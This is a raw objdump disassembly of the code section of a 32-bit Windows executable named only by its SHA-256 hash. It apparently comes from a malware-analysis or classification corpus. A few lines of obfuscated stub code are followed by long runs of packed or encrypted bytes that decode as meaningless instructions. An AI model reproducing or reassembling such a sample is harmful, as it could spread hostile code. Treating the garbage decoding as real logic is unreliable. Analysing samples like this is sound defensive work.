
c51cf238c2d60c25dbabaa826d847f5763c962dfe6c73a95fad77ffb5bc8dece.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	add    DWORD PTR ds:0x4282b7,edx
  40100c:	mov    eax,DWORD PTR [ebp-0x50]
  40100f:	cmp    DWORD PTR ds:0x42835f,0x0
  401016:	mov    DWORD PTR ds:0x42832f,0x2f64
  401020:	not    ecx
  401022:	jmp    0x401482
  401027:	mov    DWORD PTR ds:0x42827f,0x2f16
  401031:	not    ecx
  401033:	cmp    DWORD PTR ds:0x42835f,0x0
  40103a:	jne    0x401066
  401040:	push   0x2daf
  401045:	call   DWORD PTR ds:0x428db4
  40104b:	mov    ecx,DWORD PTR ds:0x4283e7
  401051:	sub    DWORD PTR ds:0x42829b,ecx
  401057:	movzx  ecx,WORD PTR ds:0x4282c7
  40105e:	and    DWORD PTR ds:0x428283,ecx
  401064:	add    ecx,ecx
  401066:	mov    ecx,DWORD PTR ds:0x42820f
  40106c:	xor    edx,edx
  40106e:	add    edx,DWORD PTR ds:0x428307
  401074:	sub    ecx,edx
  401076:	xor    ecx,DWORD PTR [ecx+edx*1]
  401079:	adc    DWORD PTR ds:0x4283bf,0x71ea
  401083:	mov    ecx,DWORD PTR ds:0x4282eb
  401089:	mov    edx,DWORD PTR ds:0x4283eb
  40108f:	sub    edx,ecx
  401091:	xor    ecx,DWORD PTR [ecx+edx*1]
  401094:	adc    DWORD PTR ds:0x42834f,ebx
  40109a:	and    DWORD PTR ds:0x428297,0x4c59
  4010a4:	jmp    0x401482
  4010a9:	jae    0x4010a7
  4010ab:	ins    DWORD PTR es:[edi],dx
  4010ac:	mov    cl,0x5b
  4010ae:	and    DWORD PTR [ebx],esi
  4010b0:	cmp    ebp,DWORD PTR [edx-0x3e41034d]
  4010b6:	adc    BYTE PTR [edi-0x44],ah
  4010b9:	sbb    BYTE PTR [eax],bl
  4010bb:	sbb    BYTE PTR [eax],bl
  4010bd:	sahf   
  4010be:	adc    bl,BYTE PTR [eax]
  4010c0:	sbb    cl,ah
  4010c2:	std    
  4010c3:	push   ebp
  4010c4:	ffreep st(0)
  4010c6:	mov    ?,eax
  4010c8:	mov    cl,0xf9
  4010ca:	cmp    dh,ah
  4010cc:	cs sbb bh,dl
  4010cf:	adc    BYTE PTR [ecx+0x17f90b10],dh
  4010d5:	jno    0x401135
  4010d7:	sbb    eax,0x648fe8fa
  4010dc:	(bad)  
  4010de:	mov    esp,0xa611f941
  4010e3:	and    eax,0x732a514e
  4010e8:	inc    edx
  4010e9:	mov    ds:0x95d8e3bf,eax
  4010ee:	cld    
  4010ef:	clc    
  4010f0:	sub    eax,0xcd39b412
  4010f5:	dec    eax
  4010f6:	pop    esp
  4010f7:	push   edx
  4010f8:	and    al,0x9
  4010fa:	fcomp  QWORD PTR [ebx-0x3e921a10]
  401100:	dec    esi
  401101:	inc    edx
  401102:	jp     0x4010dc
  401104:	clc    
  401105:	xchg   esp,eax
  401106:	xor    BYTE PTR [ebx],0x95
  401109:	jle    0x40110b
  40110b:	sti    
  40110c:	xchg   esi,eax
  40110d:	mov    DWORD PTR [ebx],ecx
  40110f:	arpl   WORD PTR fs:[ebp+esi*4-0x6c5f57e5],sp
  401117:	jmp    0x4010a3
  401119:	adc    edi,ebx
  40111b:	aam    0x2c
  40111d:	push   ds
  40111e:	or     eax,0x6513018d
  401123:	and    al,0xa3
  401125:	call   0x9799:0x6c8f814e
  40112c:	cmp    DWORD PTR [ebx],edx
  40112e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40112f:	inc    esp
  401130:	add    BYTE PTR [edi],ch
  401132:	(bad)  
  401133:	jmp    0x9f70ccaf
  401138:	and    dh,BYTE PTR [ecx+0xc7b9014]
  40113e:	retfw  
  401140:	sbb    edx,DWORD PTR [ecx+0x62]
  401143:	push   cs
  401144:	mov    ebx,0x9eca872c
  401149:	(bad)  
  40114a:	inc    ebp
  40114b:	fsubr  DWORD PTR ds:0x4e676b3a
  401151:	mov    WORD PTR [ebx],?
  401153:	jmp    0x4010d8
  401155:	and    ebx,esp
  401157:	fld    QWORD PTR [edx]
  401159:	mov    bl,0xb9
  40115b:	shl    DWORD PTR [ecx-0x2ba74551],0xdb
  401162:	dec    eax
  401163:	aas    
  401164:	pop    eax
  401165:	and    esp,DWORD PTR [ecx]
  401167:	and    BYTE PTR [ecx+0xd],0x42
  40116b:	dec    ebx
  40116c:	repnz sbb esp,esp
  40116f:	cdq    
  401170:	not    DWORD PTR [ebx]
  401172:	out    dx,al
  401173:	aam    0x6d
  401175:	wbinvd 
  401177:	cli    
  401178:	pop    ss
  401179:	inc    ebx
  40117a:	fdiv   DWORD PTR [ebp+0x19]
  40117d:	pop    ebx
  40117e:	mov    esi,0x58e609d8
  401183:	stc    
  401184:	(bad)  
  401186:	std    
  401187:	nop
  401188:	add    al,0x78
  40118a:	shr    edi,0xa9
  40118d:	imul   eax,DWORD PTR [ecx+0x71],0xffffffbf
  401191:	retf   0xfd29
  401194:	inc    esi
  401195:	cmp    eax,0x5bdd58dc
  40119a:	cdq    
  40119b:	dec    eax
  40119c:	mov    edx,0xec085af0
  4011a1:	push   ecx
  4011a2:	lock (bad) 
  4011a4:	jmp    0x40121b
  4011a6:	adc    eax,0x56816440
  4011ab:	repz loop 0x401168
  4011ae:	repz mov ch,0x50
  4011b1:	mov    ds:0x97e90389,al
  4011b6:	out    dx,al
  4011b7:	popf   
  4011b8:	popf   
  4011b9:	xchg   edx,eax
  4011ba:	mov    WORD PTR [ecx+0x3f134621],gs
  4011c0:	mov    ah,ah
  4011c2:	shl    DWORD PTR [ecx-0x49],1
  4011c5:	ret    
  4011c6:	pop    edx
  4011c7:	and    DWORD PTR [ebx],ebx
  4011c9:	adc    DWORD PTR [ebp-0x41],eax
  4011cc:	and    al,BYTE PTR [ebp+0x4522fc94]
  4011d2:	mov    ch,0x23
  4011d4:	mov    dl,0x6b
  4011d6:	popf   
  4011d7:	and    edx,esp
  4011d9:	or     edx,DWORD PTR [edx+edi*8+0x7fbb8294]
  4011e0:	stos   BYTE PTR es:[edi],al
  4011e1:	cmp    DWORD PTR [edi-0x56b52be1],esi
  4011e7:	hlt    
  4011e8:	sahf   
  4011e9:	cmp    al,0x25
  4011eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4011ec:	push   esi
  4011ed:	add    eax,0xe25cf43e
  4011f2:	jo     0x4011c1
  4011f4:	call   FWORD PTR [eax-0x70f340d4]
  4011fa:	pushf  
  4011fb:	sti    
  4011fc:	ds cmc 
  4011fe:	(bad)  [eax]
  401200:	inc    edx
  401201:	or     DWORD PTR [edx+0x739f3636],eax
  401207:	lods   al,BYTE PTR ds:[esi]
  401208:	sub    eax,0xd5c6868c
  40120d:	mov    esp,0xaf5c7775
  401212:	mov    ebp,0xc61d61f6
  401217:	mov    bh,0xcb
  401219:	xor    BYTE PTR [eax+0x11],bl
  40121c:	inc    ebp
  40121d:	mov    esp,0xcc543e3
  401222:	sub    DWORD PTR [ecx+0x4e4ac2e2],esp
  401228:	pusha  
  401229:	jns    0x401261
  40122b:	jns    0x4011f3
  40122d:	inc    edx
  40122e:	jnp    0x40123b
  401230:	les    edi,FWORD PTR [eax]
  401232:	fs (bad) 
  401234:	out    dx,al
  401235:	push   ebp
  401236:	push   es
  401237:	enter  0x597b,0xa0
  40123b:	push   ss
  40123c:	sti    
  40123d:	jo     0x4011cc
  40123f:	les    edx,FWORD PTR [ebp+0x36]
  401242:	pop    ebp
  401243:	ja     0x40125d
  401245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401246:	leave  
  401247:	bound  ebp,QWORD PTR [eax]
  401249:	test   al,0x15
  40124b:	shl    DWORD PTR [ecx+0x3c15d4a2],1
  401251:	hlt    
  401252:	dec    esi
  401253:	loop   0x40121a
  401255:	scas   al,BYTE PTR es:[edi]
  401256:	pop    edi
  401257:	add    al,0x8b
  401259:	test   eax,0x86944e25
  40125e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40125f:	xchg   ebx,eax
  401260:	fadd   QWORD PTR [edi+0x54]
  401263:	pop    edi
  401264:	jle    0x4012aa
  401266:	xor    ebx,DWORD PTR [eax+0x1b886b06]
  40126c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40126d:	adc    DWORD PTR [ecx],ebx
  40126f:	pop    eax
  401270:	xchg   esi,eax
  401271:	rcr    ecx,1
  401273:	inc    eax
  401274:	jecxz  0x4012a7
  401276:	or     cl,BYTE PTR [esi]
  401278:	lea    ebp,[esi]
  40127a:	xor    eax,0xf6172d5e
  40127f:	xor    al,BYTE PTR [esp+eiz*4]
  401282:	enter  0xac09,0xfa
  401286:	inc    edi
  401287:	int    0x61
  401289:	inc    ebp
  40128a:	ds scas al,BYTE PTR es:[edi]
  40128c:	repnz mov esi,0x30094760
  401292:	addr16 sahf 
  401294:	pop    eax
  401295:	jno    0x40124c
  401297:	inc    eax
  401298:	sbb    dh,0x9a
  40129b:	sbb    edi,edx
  40129d:	inc    esp
  40129e:	mov    ds:0xa979957d,al
  4012a3:	pop    esp
  4012a4:	xor    DWORD PTR [edi+0x18],ebx
  4012a7:	and    DWORD PTR ds:0x42dfc3f8,edi
  4012ad:	idiv   BYTE PTR [bx+di]
  4012b0:	add    BYTE PTR [eax-0x7e1a7ea9],dl
  4012b6:	hlt    
  4012b7:	call   0x82b8:0xf82571ba
  4012be:	iret   
  4012bf:	fstp   QWORD PTR [ebx+ecx*8-0x190eba25]
  4012c6:	outs   dx,BYTE PTR ds:[esi]
  4012c7:	int    0x8e
  4012c9:	pop    edx
  4012ca:	in     al,0x61
  4012cc:	jl     0x4012e2
  4012ce:	aaa    
  4012cf:	loope  0x401292
  4012d1:	jbe    0x4012c2
  4012d3:	sar    BYTE PTR [ecx+edx*8],cl
  4012d6:	xchg   dh,ch
  4012d8:	rcr    DWORD PTR [esi-0x37],cl
  4012db:	pop    eax
  4012dc:	sub    eax,0xe816f5da
  4012e1:	dec    eax
  4012e2:	mov    ds:0x9e64f181,al
  4012e7:	xor    eax,0xbe078dd4
  4012ec:	xchg   ebp,eax
  4012ed:	(bad)  [esi+0x182968a7]
  4012f3:	adc    DWORD PTR [edi-0x36],0x42de688e
  4012fa:	dec    ecx
  4012fb:	sahf   
  4012fc:	jp     0x4012a7
  4012fe:	mov    ecx,ebp
  401300:	lods   eax,DWORD PTR ds:[esi]
  401301:	jno    0x4012ef
  401303:	mov    ebp,0x5b9d6770
  401308:	mov    ah,0xd7
  40130a:	dec    edx
  40130b:	sar    DWORD PTR [eax-0x5],cl
  40130e:	in     eax,dx
  40130f:	pushf  
  401310:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401311:	xchg   ebx,eax
  401312:	nop
  401313:	outs   dx,BYTE PTR ds:[esi]
  401314:	lods   al,BYTE PTR ds:[esi]
  401315:	icebp  
  401316:	sti    
  401317:	pop    eax
  401318:	jbe    0x4012e6
  40131a:	and    ecx,edi
  40131c:	or     BYTE PTR [ebx-0x34],0xa6
  401320:	std    
  401321:	inc    edi
  401322:	fwait
  401323:	imul   edx,DWORD PTR [ecx+0x69],0x7
  401327:	lock arpl WORD PTR [edi+0x396dab55],bp
  40132e:	loope  0x401315
  401330:	mov    ds:0xd97dc5c,al
  401335:	ja     0x4012f8
  401337:	fisttp WORD PTR [ebx+eax*4+0x1f5529a2]
  40133e:	div    DWORD PTR [ecx-0x19]
  401341:	and    DWORD PTR [eax+0xdb493b8],ebp
  401347:	xchg   DWORD PTR [eax],esp
  401349:	cmp    ah,0xad
  40134c:	adc    eax,0x89d2587f
  401351:	push   esi
  401352:	mov    cs,WORD PTR [edi]
  401354:	xchg   edi,eax
  401355:	xlat   BYTE PTR ds:[ebx]
  401356:	push   ecx
  401357:	pop    esp
  401358:	sbb    DWORD PTR [edx+0x1f8632be],eax
  40135e:	mov    edx,0xd75f73b8
  401363:	adc    BYTE PTR ds:0x9da7d719,bl
  401369:	div    bl
  40136b:	push   esp
  40136c:	mov    edx,DWORD PTR [edx+esi*1+0x461c4da7]
  401373:	jg     0x4013da
  401375:	in     eax,dx
  401376:	test   BYTE PTR [edx],dh
  401378:	pop    ss
  401379:	xlat   BYTE PTR ds:[ebx]
  40137a:	push   ss
  40137b:	pusha  
  40137c:	push   eax
  40137d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40137e:	dec    eax
  40137f:	and    al,0xef
  401381:	push   esp
  401382:	scas   eax,DWORD PTR es:[edi]
  401383:	scas   al,BYTE PTR es:[edi]
  401384:	or     ecx,DWORD PTR [eax-0x7e]
  401387:	aas    
  401388:	sti    
  401389:	cld    
  40138a:	xlat   BYTE PTR ds:[ebx]
  40138b:	mov    ecx,0x55870434
  401390:	sbb    esi,edx
  401392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401393:	stc    
  401394:	add    al,BYTE PTR [edi-0x34]
  401397:	les    ebp,FWORD PTR [esp+ebx*1-0x41]
  40139b:	js     0x4013ca
  40139d:	mov    WORD PTR [eax],es
  40139f:	or     BYTE PTR [ecx+0x58],ch
  4013a2:	enter  0x4c6e,0x93
  4013a6:	dec    edi
  4013a7:	(bad)  
  4013a8:	std    
  4013a9:	jmp    FWORD PTR [ecx]
  4013ab:	cmp    DWORD PTR [edi-0x5fe135b0],edi
  4013b1:	push   eax
  4013b2:	and    esp,DWORD PTR [ebx]
  4013b4:	push   ebx
  4013b5:	mov    dl,0xba
  4013b7:	pushf  
  4013b8:	imul   eax,esi,0x6f4027ca
  4013be:	loopne 0x401432
  4013c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013c1:	pop    esi
  4013c2:	(bad)  
  4013c3:	iret   
  4013c4:	jge    0x401370
  4013c6:	dec    ebx
  4013c7:	imul   ecx,DWORD PTR [eax],0xcc70017
  4013cd:	ds sub al,0xf8
  4013d0:	scas   al,BYTE PTR es:[edi]
  4013d1:	aad    0x6d
  4013d3:	push   esp
  4013d4:	mov    fs,WORD PTR [eax+0x60f7d3ff]
  4013da:	dec    edi
  4013db:	add    DWORD PTR [esi-0x6],esp
  4013de:	cld    
  4013df:	jbe    0x4013ed
  4013e1:	rol    DWORD PTR [esi-0x3],cl
  4013e4:	popf   
  4013e5:	mov    ecx,esi
  4013e7:	in     eax,dx
  4013e8:	gs cdq 
  4013ea:	add    al,0xf5
  4013ec:	pop    ebx
  4013ed:	aas    
  4013ee:	sahf   
  4013ef:	xchg   ecx,eax
  4013f0:	repz popa 
  4013f2:	(bad)  
  4013f3:	(bad)  
  4013f4:	in     eax,dx
  4013f5:	mov    dh,0x8f
  4013f7:	leave  
  4013f8:	cmp    DWORD PTR [ebp+0x1f],esi
  4013fb:	lods   al,BYTE PTR ds:[esi]
  4013fc:	sub    al,cl
  4013fe:	xchg   esi,eax
  4013ff:	call   0x491a5b6f
  401404:	loop   0x40138d
  401406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401407:	ds dec dx
  40140a:	stos   BYTE PTR es:[edi],al
  40140b:	add    BYTE PTR [ebx-0x4a],0x4
  40140f:	cs loope 0x40140b
  401412:	(bad)  
  401413:	fisttp DWORD PTR [ecx+edx*1+0x46]
  401417:	adc    al,0xe8
  401419:	pop    ecx
  40141a:	stos   DWORD PTR es:[edi],eax
  40141b:	(bad)  
  40141c:	fild   WORD PTR [ecx-0xee91c04]
  401422:	aaa    
  401423:	lods   eax,DWORD PTR ds:[esi]
  401424:	jecxz  0x40146b
  401426:	outs   dx,DWORD PTR ds:[esi]
  401427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401428:	push   eax
  401429:	dec    ebx
  40142a:	push   ds
  40142b:	scas   eax,DWORD PTR es:[edi]
  40142c:	mov    al,BYTE PTR ds:0x57354048
  401432:	(bad)  [ebp+0x20]
  401435:	addr16 (bad) 
  401437:	int3   
  401438:	pusha  
  401439:	js     0x401454
  40143b:	jecxz  0x401417
  40143d:	cmp    ecx,DWORD PTR [eax*4+0x5c5c0f6f]
  401444:	cli    
  401445:	dec    ecx
  401446:	and    ch,dh
  401448:	xchg   ebp,eax
  401449:	imul   ebx,DWORD PTR [ebp+0x16],0xffffff96
  40144d:	ins    BYTE PTR es:[edi],dx
  40144e:	cmp    al,0x14
  401450:	xchg   al,cl
  401452:	mov    eax,ds:0x981b4cd5
  401457:	in     al,0xca
  401459:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40145a:	inc    ecx
  40145b:	or     cl,al
  40145d:	push   edi
  40145e:	jmp    0xbf6db0cc
  401463:	int    0xa8
  401465:	mov    ebp,0xc7192e64
  40146a:	popf   
  40146b:	sbb    BYTE PTR [eax-0x48db34ee],al
  401471:	aad    0x67
  401473:	js     0x401426
  401475:	sub    DWORD PTR [ecx+0x141ee665],eax
  40147b:	jmp    0xb5d9:0x45271a50
  401482:	mov    ecx,DWORD PTR [ebp-0x4c]
  401485:	mov    edx,DWORD PTR [ebp-0x50]
  401488:	sub    eax,edx
  40148a:	mov    DWORD PTR ds:0x4283af,edx
  401490:	push   edi
  401491:	mov    edi,DWORD PTR [ebp-0x4c]
  401494:	mov    DWORD PTR [ebp-0x50],eax
  401497:	mov    edx,0x488c
  40149c:	sbb    ecx,edi
  40149e:	mov    DWORD PTR [ebp-0x4c],ecx
  4014a1:	mov    edx,DWORD PTR ds:0x4282eb
  4014a7:	mov    edx,DWORD PTR [edx]
  4014a9:	and    DWORD PTR ds:0x42833b,edx
  4014af:	or     DWORD PTR [ebp-0x50],0xca78cc41
  4014b6:	or     DWORD PTR [ebp-0x4c],0x9c1b89e8
  4014bd:	and    DWORD PTR ds:0x42826b,0x6649
  4014c7:	mov    eax,DWORD PTR [ebp-0x58]
  4014ca:	add    ecx,0xa44
  4014d0:	mov    ecx,DWORD PTR [ebp-0x54]
  4014d3:	cmp    DWORD PTR ds:0x428293,0x0
  4014da:	mov    DWORD PTR ds:0x42826f,ecx
  4014e0:	mov    DWORD PTR ds:0x428333,0x3ae4
  4014ea:	mov    edi,0x1ebc
  4014ef:	mov    edx,0x7e4f
  4014f4:	jmp    0x40154f
  4014f9:	not    DWORD PTR ds:0x4281ab
  4014ff:	mov    edx,0x300f
  401504:	cmp    DWORD PTR ds:0x428293,0x0
  40150b:	jae    0x401543
  401511:	push   0x1b93
  401516:	call   DWORD PTR ds:0x428db8
  40151c:	mov    edx,DWORD PTR ds:0x42830b
  401522:	xor    edi,edi
  401524:	or     edi,DWORD PTR ds:0x428383
  40152a:	sub    edx,edi
  40152c:	or     edx,DWORD PTR [edx+edi*1]
  40152f:	xor    edx,edx
  401531:	add    edx,DWORD PTR ds:0x4281df
  401537:	mov    edi,DWORD PTR ds:0x428387
  40153d:	sub    edi,edx
  40153f:	imul   edx,DWORD PTR [edx+edi*1]
  401543:	and    edi,0x359a
  401549:	or     edi,0x3261
  40154f:	mov    edx,DWORD PTR [ebp-0x58]
  401552:	mov    edi,DWORD PTR [ebp-0x54]
  401555:	jmp    0x401933
  40155a:	outs   dx,DWORD PTR ds:[esi]
  40155b:	add    eax,0x3a5a4a0b
  401560:	das    
  401561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401562:	out    dx,al
  401563:	sbb    ebx,DWORD PTR [ebp+0x7336ff70]
  401569:	jl     0x401509
  40156b:	adc    bl,BYTE PTR [eax]
  40156d:	sbb    BYTE PTR [esi-0x19e7e7ee],bl
  401573:	imul   eax,DWORD PTR [edi-0x2fcdb722],0x7af8c34e
  40157d:	popa   
  40157e:	daa    
  40157f:	std    
  401580:	iret   
  401581:	lods   al,BYTE PTR ds:[esi]
  401582:	jbe    0x401520
  401584:	push   esp
  401585:	stc    
  401586:	leave  
  401587:	out    0x7e,eax
  401589:	je     0x4015ba
  40158b:	test   BYTE PTR [edi],0x7c
  40158e:	xlat   BYTE PTR ds:[ebx]
  40158f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401590:	in     eax,0x9b
  401592:	cmp    cl,cl
  401594:	xor    al,bl
  401596:	and    DWORD PTR [ebx],edi
  401598:	stos   BYTE PTR es:[edi],al
  401599:	ja     0x4015e4
  40159b:	adc    edi,DWORD PTR [ebx+0x2385da21]
  4015a1:	lods   al,BYTE PTR ds:[esi]
  4015a2:	lahf   
  4015a3:	(bad)  
  4015a4:	jo     0x4015fe
  4015a6:	mov    dh,0xd7
  4015a8:	iret   
  4015a9:	mov    bh,0x4a
  4015ab:	pop    edx
  4015ac:	inc    ebp
  4015ad:	pop    ecx
  4015ae:	in     al,dx
  4015af:	cmp    BYTE PTR [ebp+0x12f67e1c],ah
  4015b5:	ficomp WORD PTR [ecx]
  4015b7:	mov    bh,0xf3
  4015b9:	dec    ecx
  4015ba:	xchg   esi,eax
  4015bb:	jle    0x401543
  4015bd:	stos   DWORD PTR es:[edi],eax
  4015be:	push   ebx
  4015bf:	neg    esi
  4015c1:	inc    esp
  4015c2:	pop    edx
  4015c3:	pop    edx
  4015c4:	scas   eax,DWORD PTR es:[edi]
  4015c5:	mov    dl,0x8
  4015c7:	dec    ecx
  4015c8:	sar    dl,cl
  4015ca:	out    dx,al
  4015cb:	add    BYTE PTR [ebx-0x5c],ah
  4015ce:	add    ebp,ecx
  4015d0:	push   edx
  4015d1:	popa   
  4015d2:	adc    DWORD PTR [ebx],edi
  4015d4:	(bad)  
  4015d5:	cs xchg esp,eax
  4015d7:	pushf  
  4015d8:	mov    dh,0x9d
  4015da:	adc    al,0xca
  4015dc:	sub    dl,BYTE PTR [edx-0x17]
  4015df:	jmp    DWORD PTR [ebp-0x6b]
  4015e2:	xchg   ebx,eax
  4015e3:	mov    ds:0x55a95f82,al
  4015e8:	je     0x4015ea
  4015ea:	(bad)  
  4015eb:	jle    0x4015bf
  4015ed:	test   eax,0xd4f306b1
  4015f2:	mov    dh,0xf
  4015f4:	es scas eax,DWORD PTR es:[edi]
  4015f6:	lock mov al,0x73
  4015f9:	or     DWORD PTR [edi+ebx*8+0x7b93a724],esp
  401600:	adc    DWORD PTR [ecx+edx*4],esp
  401603:	mov    ch,0xcd
  401605:	hlt    
  401606:	jnp    0x4015ec
  401608:	adc    eax,0x6b49d41f
  40160d:	lods   eax,DWORD PTR ds:[esi]
  40160e:	fisttp QWORD PTR [edi-0x1e]
  401611:	fld1   
  401613:	ja     0x40166a
  401615:	jl     0x401664
  401617:	sar    BYTE PTR [ebx],0x74
  40161a:	dec    eax
  40161b:	push   edi
  40161c:	fsubr  QWORD PTR [edx-0x53]
  40161f:	aam    0x9f
  401621:	stos   BYTE PTR es:[edi],al
  401622:	(bad)  
  401624:	loop   0x40162a
  401626:	sbb    eax,0xfe50389f
  40162b:	xor    BYTE PTR [esi+0x47],al
  40162e:	cdq    
  40162f:	inc    esp
  401630:	in     al,0x93
  401632:	test   ax,0xd82d
  401636:	arpl   WORD PTR [ebp-0x1],di
  401639:	pop    esp
  40163a:	lahf   
  40163b:	loopne 0x401673
  40163d:	xor    al,ch
  40163f:	jb     0x40163d
  401641:	mov    eax,ds:0x1d8b5a8a
  401646:	push   esp
  401647:	push   esi
  401648:	jl     0x401694
  40164a:	in     eax,dx
  40164b:	sbb    eax,DWORD PTR [edx]
  40164d:	das    
  40164e:	xchg   BYTE PTR [edi],ch
  401650:	loop   0x401644
  401652:	jne    0x40160c
  401654:	xchg   ebx,eax
  401655:	nop
  401656:	and    BYTE PTR [ecx],bh
  401658:	loopne 0x4016c4
  40165a:	mov    dh,0xf8
  40165c:	test   ebx,0xda5b0beb
  401662:	fs push es
  401664:	mov    al,0xa6
  401666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401667:	dec    BYTE PTR [ecx]
  401669:	pop    edi
  40166a:	xor    eax,0x8769df27
  40166f:	imul   esi,DWORD PTR [esi-0x5e],0x1384434c
  401676:	pushf  
  401677:	mov    ebx,0xadd512c7
  40167c:	adc    BYTE PTR [esi],0x39
  40167f:	mov    dl,0x9f
  401681:	adc    al,0x47
  401683:	inc    edi
  401684:	pop    esp
  401685:	add    dl,BYTE PTR [ecx+0x49]
  401688:	cmp    ch,0x4c
  40168b:	mov    eax,0x8e5d9144
  401690:	cmp    ebp,DWORD PTR [ebp+edi*4-0x18]
  401694:	iret   
  401695:	adc    bh,BYTE PTR [ebx+0x69f9b92c]
  40169b:	cwde   
  40169c:	stc    
  40169d:	jmp    0xe64c2d9f
  4016a2:	sub    ebp,DWORD PTR [esp+edi*1-0x53b0d01]
  4016a9:	add    BYTE PTR [ecx-0x33],bl
  4016ac:	push   edi
  4016ad:	sbb    eax,0x58a53184
  4016b2:	mov    eax,0xbce691c
  4016b7:	movsx  edx,BYTE PTR [edx-0x4]
  4016bb:	std    
  4016bc:	adc    eax,0xc53dbb52
  4016c1:	xchg   ebp,eax
  4016c2:	(bad)  
  4016c3:	outs   dx,DWORD PTR ds:[esi]
  4016c4:	out    dx,eax
  4016c5:	faddp  st(2),st
  4016c7:	cmp    edx,esi
  4016c9:	mov    DWORD PTR [eax+0x6b2c02f7],ebx
  4016cf:	popf   
  4016d0:	jne    0x4016b5
  4016d2:	(bad)  
  4016d3:	sub    eax,DWORD PTR [edx+0x7e]
  4016d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016d7:	ret    
  4016d8:	push   edi
  4016d9:	mov    fs,ecx
  4016db:	mov    ch,0x9f
  4016dd:	and    ecx,DWORD PTR [ecx+0x39]
  4016e0:	ss xchg edi,eax
  4016e2:	pop    ebp
  4016e3:	scas   al,BYTE PTR es:[edi]
  4016e4:	lock aas 
  4016e6:	mov    esi,0xef766c67
  4016eb:	mov    bh,0x1b
  4016ed:	xchg   edx,eax
  4016ee:	mov    esi,DWORD PTR [esi]
  4016f0:	enter  0x448f,0x30
  4016f4:	dec    edi
  4016f5:	(bad)  
  4016f6:	dec    DWORD PTR [ebx+0xc2e57f5]
  4016fc:	xchg   ebx,eax
  4016fd:	test   eax,0x2fd10311
  401702:	arpl   dx,ax
  401704:	in     eax,dx
  401705:	iret   
  401706:	mov    esp,0x3877364b
  40170b:	fcmovnbe st,st(7)
  40170d:	inc    eax
  40170e:	je     0x401777
  401710:	xor    BYTE PTR [ecx+0x4bead124],bh
  401716:	jle    0x40171a
  401718:	pushf  
  401719:	lods   eax,DWORD PTR ds:[esi]
  40171a:	stc    
  40171b:	pop    ebx
  40171c:	popa   
  40171d:	std    
  40171e:	pop    ebx
  40171f:	xor    edx,DWORD PTR [eax]
  401721:	lock add eax,0xf1d789ab
  401727:	pop    ebp
  401728:	jp     0x4016e2
  40172a:	adc    al,0x4e
  40172c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40172d:	dec    ebx
  40172e:	iret   
  40172f:	cmp    esp,DWORD PTR [ecx-0x578355b1]
  401735:	mov    ecx,0xb0fc338
  40173a:	xlat   BYTE PTR ds:[ebx]
  40173b:	jb     0x40178d
  40173d:	cmp    al,0x8
  40173f:	sbb    dl,cl
  401741:	jne    0x4017a6
  401743:	ins    DWORD PTR es:[edi],dx
  401744:	xchg   esi,eax
  401745:	repnz fs mov cl,0x5d
  401749:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40174b:	rcr    BYTE PTR [eax-0x2d],1
  40174e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40174f:	pop    ds
  401750:	pop    ebp
  401751:	pop    ecx
  401752:	retf   
  401753:	scas   eax,DWORD PTR es:[edi]
  401754:	shl    DWORD PTR [esi+eiz*4-0x1c],1
  401758:	pop    edx
  401759:	out    0x3e,al
  40175b:	out    dx,al
  40175c:	mov    eax,DWORD PTR [eax+0x55]
  40175f:	pop    ebp
  401760:	and    al,0xc8
  401762:	imul   ecx,DWORD PTR [edi+0x6d64b6d2],0xef5e6669
  40176c:	xor    eax,0xb1f77672
  401771:	retf   
  401772:	xchg   ebp,eax
  401773:	fimul  DWORD PTR [ebx-0x10]
  401776:	popf   
  401777:	dec    esi
  401778:	pushf  
  401779:	fld    DWORD PTR [esi-0x73]
  40177c:	push   ecx
  40177d:	add    dl,BYTE PTR [ebx+0x50f5c1de]
  401783:	shl    BYTE PTR ss:[ebp+0x3c7565c7],cl
  40178a:	xchg   eax,edi
  40178c:	jne    0x401735
  40178e:	or     DWORD PTR [esi+0x10],ecx
  401791:	popf   
  401792:	xchg   ebx,eax
  401793:	cmp    DWORD PTR [ecx-0x383447e3],0xe3a37e08
  40179d:	jge    0x4017fb
  40179f:	(bad)  [esi-0x5f100825]
  4017a5:	push   ebx
  4017a6:	mov    fs,eax
  4017a8:	sbb    eax,0xea1226df
  4017ae:	cmp    edi,esp
  4017b0:	mov    edx,0x84867a48
  4017b5:	adc    eax,DWORD PTR [ecx+0x1c]
  4017b8:	stc    
  4017b9:	pop    ss
  4017ba:	adc    dx,WORD PTR [ebp-0xbc495bf]
  4017c1:	lods   eax,DWORD PTR ds:[esi]
  4017c2:	push   edi
  4017c3:	mov    ebp,es
  4017c5:	cmp    DWORD PTR [edx+0xa],0x8d78157
  4017cc:	out    dx,eax
  4017cd:	jns    0x4017cc
  4017cf:	jns    0x40175f
  4017d1:	or     cl,BYTE PTR [esi]
  4017d3:	add    BYTE PTR [eax-0x69ae5aab],dh
  4017d9:	test   eax,0x6f77251b
  4017de:	mov    al,0xad
  4017e0:	jg     0x40179b
  4017e2:	sub    bl,BYTE PTR [edx]
  4017e4:	ins    BYTE PTR es:[edi],dx
  4017e5:	mov    bh,0x58
  4017e7:	and    BYTE PTR [edi-0x448af6f1],ch
  4017ed:	cld    
  4017ee:	jp     0x4017af
  4017f0:	ss nop
